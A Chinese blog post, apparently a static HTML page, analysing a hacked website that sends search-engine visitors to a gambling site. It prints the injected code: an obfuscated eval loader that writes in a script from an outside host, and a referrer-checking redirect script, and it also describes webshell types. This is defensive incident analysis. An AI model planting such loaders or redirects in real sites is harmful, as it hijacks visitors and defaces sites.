@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>记一次站点被挂马问题排查 - SFLYQ的博客</title><meta name="Description" content=""><meta property="og:title" content="记一次站点被挂马问题排查" />
+<meta property="og:description" content="起因，在下班准备回家之际，收到几条朋友发来的信息，说他的网站在百度搜索做信息流广告推广，但是从百度搜索点击打开就会跳转的博彩网站，让我帮忙排" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://sflaqiu.github.io/posts/2018-09-13-anquan-guama/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2018-09-13T08:00:00+08:00" />
+<meta property="article:modified_time" content="2018-09-13T08:00:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="记一次站点被挂马问题排查"/>
+<meta name="twitter:description" content="起因，在下班准备回家之际，收到几条朋友发来的信息，说他的网站在百度搜索做信息流广告推广，但是从百度搜索点击打开就会跳转的博彩网站，让我帮忙排"/>
+<meta name="application-name" content="SFLYQ的博客">
+<meta name="apple-mobile-web-app-title" content="SFLYQ的博客"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://sflaqiu.github.io/posts/2018-09-13-anquan-guama/" /><link rel="prev" href="http://sflaqiu.github.io/posts/2018-05-23-shared-experience/" /><link rel="next" href="http://sflaqiu.github.io/posts/2019-02-17-dahua-php/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "记一次站点被挂马问题排查",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/sflaqiu.github.io\/posts\/2018-09-13-anquan-guama\/"
+        },"genre": "posts","keywords": "挂马, 篡改","wordcount":  1518 ,
+        "url": "http:\/\/sflaqiu.github.io\/posts\/2018-09-13-anquan-guama\/","datePublished": "2018-09-13T08:00:00+08:00","dateModified": "2018-09-13T08:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "SFLYQ"},"author": {
+                "@type": "Person",
+                "name": "SFLYQ"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="SFLYQ的博客">SFLYQ的博客</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="SFLYQ的博客">SFLYQ的博客</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">记一次站点被挂马问题排查</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>SFLYQ</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw"></i>安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2018-09-13">2018-09-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1518 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>起因，在下班准备回家之际，收到几条朋友发来的信息，说他的网站在百度搜索做信息流广告推广，但是从百度搜索点击打开就会跳转的博彩网站，让我帮忙排查下问题，是不是被挂马了，于是乎就开始了后面的故事</p>
+<hr>
+<blockquote>
+<p>为了保护网站隐私，假定网站地址是：http://www.xxx.com</p>
+</blockquote>
+<p>收到消息后我尝试操作并收集到下面现象内容：</p>
+<p>现象 1：通过域名直接打开网站，可以正常打开，不会跳转到博彩站<br>
+现象 2：通过百度/搜狗搜索引擎，搜索到网站后点击打开就会跳转到博彩站</p>
+<hr>
+<h4 id="开始排查">开始排查</h4>
+<ul>
+<li><strong>网站是怎么跳转的？</strong></li>
+</ul>
+<p>网站跳转无非就是这两种：服务端重定向跳转/前端 JS 触发跳转，我开始用 Charles 抓包，列出抓包请求发起顺序大概是这样的（省略无关的请求）：</p>
+<ol>
+<li><a href="http://www.xxx.com" target="_blank" rel="noopener noreffer">http://www.xxx.com</a></li>
+<li><a href="https://www.cpdas8.com/cxc.js" target="_blank" rel="noopener noreffer">https://www.cpdas8.com/cxc.js</a></li>
+<li><a href="https://www.das8cx.com/" target="_blank" rel="noopener noreffer">https://www.das8cx.com/</a> [博彩站]</li>
+</ol>
+<p>先打开站点www.xxx.com返回Code=200，不是服务端重定向Code=302，是由前端发起跳转，并且注意到：cxc.js，请求头Referer=www.xxx.com，这个并非站点前端开发需要引入的脚本，打开地址看代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+  <span class="cm">/*百度推送代码*/</span>
+  <span class="kd">var</span> <span class="nx">bp</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">);</span>
+  <span class="nx">bp</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&#34;//push.zhanzhang.baidu.com/push.js&#34;</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+  <span class="nx">s</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">insertBefore</span><span class="p">(</span><span class="nx">bp</span><span class="p">,</span> <span class="nx">s</span><span class="p">);</span>
+  <span class="cm">/*360推送代码*/</span>
+  <span class="kd">var</span> <span class="nx">src</span> <span class="o">=</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">protocol</span> <span class="o">+</span>
+    <span class="s2">&#34;//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9&#34;</span><span class="p">;</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;script src=&#34;&#39;</span> <span class="o">+</span> <span class="nx">src</span> <span class="o">+</span> <span class="s1">&#39;&#34; id=&#34;sozz&#34;&gt;&lt;/script&gt;&#39;</span><span class="p">);</span>
+<span class="p">})();</span>
+
+<span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="s1">&#39;&lt;script LANGUAGE=&#34;Javascript&#34;&gt;&#39;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="s2">&#34;var s=document.referrer&#34;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span>
+  <span class="s1">&#39;if(s.indexOf(&#34;baidu&#34;)&gt;0 || s.indexOf(&#34;sogou&#34;)&gt;0 || s.indexOf(&#34;soso&#34;)&gt;0 ||s.indexOf(&#34;sm&#34;)&gt;0 ||s.indexOf(&#34;uc&#34;)&gt;0 ||s.indexOf(&#34;bing&#34;)&gt;0 ||s.indexOf(&#34;yahoo&#34;)&gt;0 ||s.indexOf(&#34;so&#34;)&gt;0 )&#39;</span>
+<span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="s1">&#39;location.href=&#34;https://www.das8cx.com/&#34;;&#39;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="s2">&#34;&lt;/script&gt;&#34;</span><span class="p">);</span>
+</code></pre></div><p>看代码就知道抓到了元凶，这里执行了 location.href 到博彩站，但是看主页 html 源码里并没有 cxc.js 的引入，继续后面的排查</p>
+<hr>
+<ul>
+<li><strong>cxc.js 是如何在主页里引入的？</strong></li>
+</ul>
+<p>带着这个疑问，打开了首页源码，大概过了下，没有发现引入脚本的地方，就开始怀疑是不是动态引入的，再次查看源码，看到一段被混淆加密压缩过代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nb">eval</span><span class="p">(</span>
+  <span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">p</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">d</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">e</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="p">(</span>
+        <span class="p">(</span><span class="nx">c</span> <span class="o">&lt;</span> <span class="nx">a</span> <span class="o">?</span> <span class="s2">&#34;&#34;</span> <span class="o">:</span> <span class="nx">e</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">c</span> <span class="o">/</span> <span class="nx">a</span><span class="p">)))</span> <span class="o">+</span>
+        <span class="p">((</span><span class="nx">c</span> <span class="o">=</span> <span class="nx">c</span> <span class="o">%</span> <span class="nx">a</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">35</span> <span class="o">?</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">c</span> <span class="o">+</span> <span class="mi">29</span><span class="p">)</span> <span class="o">:</span> <span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">))</span>
+      <span class="p">);</span>
+    <span class="p">};</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="s2">&#34;&#34;</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^/</span><span class="p">,</span> <span class="nb">String</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">while</span> <span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">)</span> <span class="nx">d</span><span class="p">[</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)]</span> <span class="o">=</span> <span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">||</span> <span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
+      <span class="nx">k</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">return</span> <span class="nx">d</span><span class="p">[</span><span class="nx">e</span><span class="p">];</span>
+        <span class="p">},</span>
+      <span class="p">];</span>
+      <span class="nx">e</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="s2">&#34;\\w+&#34;</span><span class="p">;</span>
+      <span class="p">};</span>
+      <span class="nx">c</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">while</span> <span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">)</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s2">&#34;\\b&#34;</span> <span class="o">+</span> <span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;\\b&#34;</span><span class="p">,</span> <span class="s2">&#34;g&#34;</span><span class="p">),</span> <span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span>
+    <span class="k">return</span> <span class="nx">p</span><span class="p">;</span>
+  <span class="p">})(</span>
+    <span class="s1">&#39;l[&#34;\\d\\e\\1\\m\\j\\8\\n\\0&#34;][&#34;\\6\\4\\9\\0\\8&#34;](\&#39;\\i\\2\\1\\4\\9\\3\\0 \\0\\k\\3\\8\\c\\7\\0\\8\\h\\0\\5\\f\\b\\q\\b\\2\\1\\4\\9\\3\\0\\7 \\2\\4\\1\\c\\7\\o\\0\\0\\3\\2\\p\\5\\5\\6\\6\\6\\a\\1\\3\\d\\b\\2\\r\\a\\1\\e\\j\\5\\1\\h\\1\\a\\f\\2\\7\\g\\i\\5\\2\\1\\4\\9\\3\\0\\g\&#39;);&#39;</span><span class="p">,</span>
+    <span class="mi">28</span><span class="p">,</span>
+    <span class="mi">28</span><span class="p">,</span>
+    <span class="s2">&#34;x74|x63|x73|x70|x72|x2f|x77|x22|x65|x69|x2e|x61|x3d|x64|x6f|x6a|x3e|x78|x3c|x6d|x79|window|x75|x6e|x68|x3a|x76|x38&#34;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span>
+      <span class="s2">&#34;|&#34;</span>
+    <span class="p">),</span>
+    <span class="mi">0</span><span class="p">,</span>
+    <span class="p">{}</span>
+  <span class="p">)</span>
+<span class="p">);</span>
+</code></pre></div><p>感觉事蹊跷，不管三七二十一先到谷歌开发者工具控制台里执行看看，截取重要提示信息：</p>
+<pre tabindex="0"><code>A parser-blocking, cross site (i.e. different eTLD+1) script,https://www.cpdas8.com/cxc.js, is invoked via document.write
+
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://blog.thankbabe.com/imgs/mm_tz.png"
+        data-srcset="http://blog.thankbabe.com/imgs/mm_tz.png, http://blog.thankbabe.com/imgs/mm_tz.png 1.5x, http://blog.thankbabe.com/imgs/mm_tz.png 2x"
+        data-sizes="auto"
+        alt="http://blog.thankbabe.com/imgs/mm_tz.png"
+        title="image" /></p>
+<p>明了了，就是这段脚本把 cxc.js 动态的引入到站点里，现在跳转的原因是找到了，但是为啥会好端端的多了这段代码，继续后面的分析</p>
+<hr>
+<ul>
+<li><strong>为什么主页源码会被篡改加入了一段脚本呢？</strong></li>
+</ul>
+<p>站点是通过阿里云服务器的虚拟空间进行部署的，服务器本身应该没有问题
+目前猜测有两种可能性：</p>
+<ol>
+<li>FTP 暴力破解，成功连接上 FTP 后进行篡改</li>
+<li>站点安全漏洞，被上传了木马程序后被执行，篡改了源码</li>
+</ol>
+<p>后面问了下 FTP 密码是设置的挺简单的，所以评估可能是 FTP 暴力破解导致，细思极恐</p>
+<hr>
+<p>番外，里面还有段篡改 SEO 关键词代码，这里也需要去掉：<br>
+篡改了 keyword/description/title
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://blog.thankbabe.com/imgs/mm_seo.png?v=666"
+        data-srcset="http://blog.thankbabe.com/imgs/mm_seo.png?v=666, http://blog.thankbabe.com/imgs/mm_seo.png?v=666 1.5x, http://blog.thankbabe.com/imgs/mm_seo.png?v=666 2x"
+        data-sizes="auto"
+        alt="http://blog.thankbabe.com/imgs/mm_seo.png?v=666"
+        title="image" /></p>
+<hr>
+<h4 id="问题总结">问题总结：</h4>
+<p>通过抓包和代码分析可以知道跳转到博彩站的流程是这样的：</p>
+<ol>
+<li>打开首页，脚本执行了 evel(混淆加密压缩)，动态引入 cxc.js</li>
+<li>引入的 cxc.js 里执行了(function (){/_ 跳转逻辑 _/})()，如果站点 referrer 是搜索引擎过来的就跳转到博彩站，不是就不做跳转直接正常打开站点</li>
+<li>知道原理后就很清晰明白上面现象的原因，并且可以很清楚的怎么去修复</li>
+</ol>
+<p>站点源码被侵入篡改问题：</p>
+<ul>
+<li>站点的开发需要注意 WEB 安全问题，文件上传漏洞，脚本注入，SQL 注入，跨站攻击，等</li>
+<li>站点的服务器/FTP/后台账号密码，不要设置的太随意，要有一定的复杂度，不然很容易被暴力破解</li>
+</ul>
+<p>常见木马类型：</p>
+<ul>
+<li>大马
+<ul>
+<li>大马体积比较大 一般 50K 以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序</li>
+</ul>
+</li>
+<li>小马
+<ul>
+<li>小马体积小，容易隐藏，隐蔽性强，最重要在于与图片结合一起上传之后可以利用 nginx 或者 IIS6 的解析漏洞来运行，不过功能少，一般只有上传等功能</li>
+</ul>
+</li>
+<li>一句话木马
+<ul>
+<li>一句话木马属于 就一句话的脚本语句 代码少 就是一句话木马属于小马</li>
+</ul>
+</li>
+</ul>
+<p>查杀工具：</p>
+<ul>
+<li><a href="https://www.huweishen.com/soft/kill/" target="_blank" rel="noopener noreffer">护卫神·云查杀</a></li>
+<li><a href="http://www.d99net.net/index.asp" target="_blank" rel="noopener noreffer">D 盾</a></li>
+</ul>
+<hr>
+<p>辅助手段-网站安全检测：</p>
+<ul>
+<li><a href="https://www.huaweicloud.com/product/vss.html" target="_blank" rel="noopener noreffer">华为漏洞扫描服务</a></li>
+<li><a href="http://webscan.360.cn/" target="_blank" rel="noopener noreffer">360 网站安全</a></li>
+<li><a href="https://ziyuan.baidu.com/safe/" target="_blank" rel="noopener noreffer">百度网站体检</a></li>
+<li><a href="http://ce.baidu.com/index/guance" target="_blank" rel="noopener noreffer">百度云观测</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2018-09-13</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%8C%82%E9%A9%AC/">挂马</a>,&nbsp;<a href="/tags/%E7%AF%A1%E6%94%B9/">篡改</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2018-05-23-shared-experience/" class="prev" rel="prev" title="大话后端开发的奇淫技巧大集合"><i class="fas fa-angle-left fa-fw"></i>大话后端开发的奇淫技巧大集合</a>
+            <a href="/posts/2019-02-17-dahua-php/" class="next" rel="next" title="大话转岗PHP开发小结">大话转岗PHP开发小结<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.88.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
